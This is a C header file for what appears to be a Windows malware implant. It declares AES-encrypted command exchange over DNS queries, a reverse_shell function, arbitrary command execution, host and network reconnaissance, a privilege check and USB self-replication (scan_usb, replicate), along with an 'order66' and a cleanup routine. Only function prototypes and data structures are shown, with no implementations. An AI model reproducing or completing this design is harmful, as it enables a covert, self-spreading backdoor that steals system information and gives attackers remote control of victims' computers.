#ifndef HEADERS_H_INCLUDED
#define HEADERS_H_INCLUDED

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include "aes.h"
#include <winsock2.h>
#include <windows.h>
#include <windns.h>
#include <winbase.h>
#include <iphlpapi.h>
#include <msi.h>
#include <wincrypt.h>
#include <ShlObj.h>
#include <urlmon.h>

/* crypto headers*/
typedef struct BUFFER {
	char* content;
	int size;
} BUFFER;

char* md5(char* string);
void random_string(unsigned char* buffer, int len);
uint8_t* generate_aes_key(char* string);
char* string2hex(BUFFER* buffer);
char* hex2string(BUFFER* buffer);
BUFFER* aes_encrypt(BUFFER* string, uint8_t* key);
BUFFER* aes_decrypt(BUFFER* hex, uint8_t* key);

/* communication headers */
#define MAX_SUBDOMAIN_LEN 63
int _delay;
char* dns_query(char* url);
void re(char* id);
void check_id(char* id);
void get_id(char* id);
int get_order(char* id);
void parse_order(char* id, char* order);
void answer_order(char* id, int order_id, char* answer);
char* build_url(BUFFER* buff, int status, char* id, int order_id);

/* modules headers*/
typedef struct NETWORK {
	char ip[16];
	char mask[16];
	char gateway[16];
	char mac[18];
	char port[6];
} NETWORK;

typedef struct HOST {
	char name[16];
	int size_network;
	NETWORK* network;
	double os;
} HOST;

typedef struct {
	char** drive;
	int size;
}USB;

int _scan_flag;
void reverse_shell(NETWORK *net);
char* get_sysinfo();
int get_hostname(HOST* host);
void get_os(HOST* host);
int get_network_info(HOST* host);
char* format_host(HOST* host);
char* exec(char* cmd);
void scan_usb();
void replicate(USB* usb);
void frequency(int delay);
void order66();
BOOL is_elevated();
void cleanup();

#endif // HEADERS_H_INCLUDED